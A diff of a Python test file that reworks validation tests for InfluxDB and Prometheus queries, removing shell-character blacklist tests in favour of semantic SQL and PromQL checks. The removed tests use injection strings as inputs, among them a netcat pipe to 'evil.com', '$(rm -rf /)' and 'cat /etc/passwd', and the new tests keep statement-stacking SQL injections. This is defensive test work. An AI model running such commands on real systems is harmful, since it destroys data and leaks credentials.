@@ -54,7 +54,7 @@ def security(config):
 
 
 class TestInfluxDBQueryValidation:
-    """InfluxDB query validation edge cases."""
+    """InfluxDB SQL validation is semantic, not a shell-character blacklist."""
 
     def setup_method(self):
         self.security = SecurityValidator({})
@@ -68,91 +68,73 @@ class TestInfluxDBQueryValidation:
         assert self.security.validate_influxdb_query([]) is None
 
     def test_non_select_rejected(self):
-        for q in ["INSERT INTO cpu VALUES (1)", "DROP TABLE cpu"]:
-            assert self.security.validate_influxdb_query(q) is None, (
-                f"Should reject non-SELECT: {q}"
-            )
+        for query in ["INSERT INTO cpu VALUES (1)", "DROP TABLE cpu"]:
+            assert self.security.validate_influxdb_query(query) is None, query
 
     def test_select_with_where_accepted(self):
-        q = "SELECT * FROM cpu WHERE time > now() - INTERVAL '1 hour' LIMIT 5"
-        result = self.security.validate_influxdb_query(q)
-        assert result == q
+        query = "SELECT * FROM cpu WHERE time > now() - INTERVAL '1 hour' LIMIT 5"
+        assert self.security.validate_influxdb_query(query) == query
 
     def test_select_with_aggregations_accepted(self):
-        q = "SELECT mean(usage_idle) FROM cpu WHERE time > now() - 1h GROUP BY host"
-        result = self.security.validate_influxdb_query(q)
-        assert result == q
+        query = "SELECT mean(usage_idle) FROM cpu WHERE time > now() - 1h GROUP BY host"
+        assert self.security.validate_influxdb_query(query) == query
 
     def test_select_with_leading_whitespace_accepted(self):
-        q = "  SELECT * FROM measurements LIMIT 100"
-        result = self.security.validate_influxdb_query(q)
-        assert result == q
-
-    def test_sql_comment_blocked(self):
+        query = "  SELECT * FROM measurements LIMIT 100"
         assert (
-            self.security.validate_influxdb_query("SELECT * FROM cpu -- comment")
-            is None
+            self.security.validate_influxdb_query(query)
+            == "SELECT * FROM measurements LIMIT 100"
         )
 
-    def test_block_comment_blocked(self):
+    def test_trailing_semicolon_is_stripped(self):
         assert (
-            self.security.validate_influxdb_query("SELECT * FROM cpu /* comment */")
-            is None
+            self.security.validate_influxdb_query("SELECT * FROM cpu;")
+            == "SELECT * FROM cpu"
         )
 
-    def test_semicolon_injection_blocked(self):
+    def test_comments_are_accepted(self):
+        for query in (
+            "SELECT * FROM cpu -- operator note",
+            "SELECT * FROM cpu /* operator note */",
+        ):
+            assert self.security.validate_influxdb_query(query) is not None
+
+    def test_quotes_and_identifiers_accepted(self):
+        for query in (
+            'SELECT * FROM "cpu load" WHERE usage >= 0.9',
+            "SELECT * FROM cpu WHERE host = 'server-1'",
+        ):
+            assert self.security.validate_influxdb_query(query) is not None
+
+    def test_multiple_statements_blocked(self):
         assert (
             self.security.validate_influxdb_query(
                 "SELECT * FROM cpu; DROP TABLE metrics"
             )
             is None
         )
-
-    def test_backtick_shell_injection_blocked(self):
-        assert (
-            self.security.validate_influxdb_query("SELECT * FROM cpu `whoami`") is None
-        )
-
-    def test_dollar_shell_injection_blocked(self):
-        assert (
-            self.security.validate_influxdb_query("SELECT * FROM cpu $(rm -rf /)")
-            is None
-        )
-
-    def test_newline_injection_blocked(self):
         assert (
             self.security.validate_influxdb_query(
-                "SELECT * FROM cpu\nDROP TABLE metrics"
+                "SELECT * FROM cpu\nDELETE FROM metrics"
             )
             is None
         )
 
-    def test_carriage_return_injection_blocked(self):
+    def test_select_into_blocked(self):
         assert (
-            self.security.validate_influxdb_query(
-                "SELECT * FROM cpu\rDROP TABLE metrics"
-            )
+            self.security.validate_influxdb_query("SELECT * FROM cpu INTO other")
             is None
         )
-
-    def test_pipe_injection_blocked(self):
-        assert (
-            self.security.validate_influxdb_query("SELECT * FROM cpu | cat /etc/passwd")
-            is None
-        )
-
-    def test_brace_injection_blocked(self):
-        assert self.security.validate_influxdb_query("SELECT * FROM cpu {evil}") is None
 
     def test_null_byte_blocked(self):
         assert self.security.validate_influxdb_query("SELECT * FROM cpu\x00") is None
 
     def test_overlong_query_blocked(self):
-        long_query = "SELECT * FROM " + "a" * 6000
-        assert self.security.validate_influxdb_query(long_query) is None
+        assert (
+            self.security.validate_influxdb_query("SELECT * FROM " + "a" * 6000) is None
+        )
 
     def test_write_keywords_blocked(self):
-        """All write-operation keywords should be rejected."""
         write_ops = [
             "DROP MEASUREMENT cpu",
             "DELETE FROM metrics",
@@ -166,14 +148,12 @@ class TestInfluxDBQueryValidation:
             "KILL QUERY 12345",
             "SET PASSWORD FOR user = 'pass'",
         ]
-        for op in write_ops:
-            assert self.security.validate_influxdb_query(op) is None, (
-                f"Should block write operation: {op}"
-            )
+        for query in write_ops:
+            assert self.security.validate_influxdb_query(query) is None, query
 
 
 class TestPrometheusQueryValidation:
-    """Prometheus PromQL query validation edge cases."""
+    """PromQL is sent over HTTP: quotes, braces and comparisons are valid."""
 
     def setup_method(self):
         self.security = SecurityValidator({})
@@ -182,12 +162,25 @@ class TestPrometheusQueryValidation:
         assert self.security.validate_prometheus_query("up") == "up"
 
     def test_rate_query_accepted(self):
-        q = "rate(http_requests_total[5m])"
-        assert self.security.validate_prometheus_query(q) == q
+        query = "rate(http_requests_total[5m])"
+        assert self.security.validate_prometheus_query(query) == query
 
     def test_histogram_quantile_accepted(self):
-        q = "histogram_quantile(0.95, rate(bucket[5m]))"
-        assert self.security.validate_prometheus_query(q) == q
+        query = "histogram_quantile(0.95, rate(bucket[5m]))"
+        assert self.security.validate_prometheus_query(query) == query
+
+    def test_label_matchers_accepted(self):
+        queries = [
+            'up{job="node"}',
+            'node_filesystem_avail_bytes{device="/dev/sda1"}',
+            "up{job='node'}",
+        ]
+        for query in queries:
+            assert self.security.validate_prometheus_query(query) == query
+
+    def test_comparisons_accepted(self):
+        for query in ("up > 0", "up == 0", "node_load1 >= 2"):
+            assert self.security.validate_prometheus_query(query) == query
 
     def test_empty_query_rejected(self):
         assert self.security.validate_prometheus_query("") is None
@@ -196,50 +189,14 @@ class TestPrometheusQueryValidation:
     def test_non_string_rejected(self):
         assert self.security.validate_prometheus_query(123) is None
 
-    def test_semicolon_injection_blocked(self):
-        assert self.security.validate_prometheus_query("up; cat /etc/passwd") is None
-
-    def test_backtick_injection_blocked(self):
-        assert self.security.validate_prometheus_query("`whoami`") is None
-
-    def test_dollar_injection_blocked(self):
-        assert self.security.validate_prometheus_query("$(rm -rf /)") is None
-
-    def test_pipe_injection_blocked(self):
-        assert self.security.validate_prometheus_query("up | nc evil.com 4444") is None
-
-    def test_redirect_injection_blocked(self):
-        assert self.security.validate_prometheus_query("up > /dev/null") is None
-
-    def test_ampersand_injection_blocked(self):
-        assert self.security.validate_prometheus_query("up & shutdown") is None
-
-    def test_single_quote_blocked(self):
-        assert self.security.validate_prometheus_query("up{job='test'}") is None
-
-    def test_double_quote_blocked(self):
-        assert self.security.validate_prometheus_query('up{job="test"}') is None
-
-    def test_newline_blocked(self):
-        assert self.security.validate_prometheus_query("up\nevil") is None
-
-    def test_backslash_blocked(self):
-        assert self.security.validate_prometheus_query("up\\ncat /etc/passwd") is None
-
-    def test_carriage_return_blocked(self):
-        assert self.security.validate_prometheus_query("up\r evil") is None
-
     def test_null_byte_blocked(self):
         assert self.security.validate_prometheus_query("up\x00evil") is None
 
+    def test_control_character_blocked(self):
+        assert self.security.validate_prometheus_query("up\x01evil") is None
+
     def test_overlong_query_blocked(self):
-        long_query = "up{" + "a" * 6000
-        assert self.security.validate_prometheus_query(long_query) is None
-
-
-# ============================================================================
-# Unit Tests - Tool Registration & Parameter Validation
-# ============================================================================
+        assert self.security.validate_prometheus_query("up{" + "a" * 6000) is None
 
 
 class TestToolRegistration:
